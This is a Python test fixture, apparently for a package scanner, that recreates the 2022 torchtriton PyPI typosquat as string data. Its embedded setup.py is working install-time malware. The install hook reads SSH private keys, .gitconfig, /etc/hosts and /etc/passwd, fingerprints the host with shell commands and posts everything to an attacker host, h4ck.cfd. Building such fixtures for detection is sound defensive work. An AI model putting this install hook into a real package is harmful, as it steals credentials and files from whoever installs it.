"""
Simulated PyTorch torchtriton (PyPI typosquatting) attack patterns.
NOT real malware -- synthetic test fixture recreating the PATTERNS only.

Source: PyTorch blog 2022-12 — torchtriton package on PyPI was a typosquat
of the legitimate pytorch-triton distributed via pytorch.org.

The real attack:
1. Uploaded a package named 'torchtriton' to PyPI that shadowed the
   legitimate 'pytorch-triton' from pytorch.org nightly index
2. setup.py contained a malicious install-time payload
3. Stole system fingerprints, SSH keys, .gitconfig, hosts file,
   /etc/passwd, and first 1000 files in $HOME
4. Exfiltrated data via DNS queries to a controlled domain (*.h4ck.cfd)
"""

# Pattern 1: setup.py with install-time data theft
SETUP_PY = """
from setuptools import setup
from setuptools.command.install import install
import subprocess
import os
import urllib.request

class CustomInstall(install):
    def run(self):
        install.run(self)
        self._post_install()

    def _post_install(self):
        # Fingerprint the host
        fingerprint = subprocess.check_output('whoami; hostname; uname -a', shell=True)

        # Steal sensitive files
        targets = [
            os.path.expanduser('~/.ssh/id_rsa'),
            os.path.expanduser('~/.ssh/id_ed25519'),
            os.path.expanduser('~/.gitconfig'),
            '/etc/hosts',
            '/etc/passwd',
        ]

        stolen = {}
        for path in targets:
            if os.path.exists(path):
                with open(path) as f:
                    stolen[path] = f.read()

        # Enumerate first 1000 files in HOME
        home_files = []
        for root, dirs, files in os.walk(os.path.expanduser('~')):
            for f in files:
                home_files.append(os.path.join(root, f))
                if len(home_files) >= 1000:
                    break
            if len(home_files) >= 1000:
                break

        # Exfiltrate via DNS (simulated as HTTP POST here)
        import json
        payload = json.dumps({
            'fingerprint': fingerprint.decode(),
            'files': stolen,
            'home_listing': home_files[:100],
        }).encode()
        req = urllib.request.Request(
            'https://evilpackage.h4ck.cfd/upload',
            data=payload,
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req)

setup(
    name="torchtriton",
    version="2.0.0",
    description="A PyTorch GPU programming toolkit",
    cmdclass={'install': CustomInstall},
)
"""

# Pattern 2: __init__.py with benign-looking code (appears legitimate)
INIT_PY = """
# torchtriton — GPU programming toolkit
__version__ = '2.0.0'

def matmul_kernel(*args, **kwargs):
    raise NotImplementedError("torchtriton is a placeholder")
"""

# All files as a dict (simulating downloaded package)
PACKAGE_FILES = {
    "torchtriton-2.0.0/setup.py": SETUP_PY,
    "torchtriton-2.0.0/torchtriton/__init__.py": INIT_PY,
}
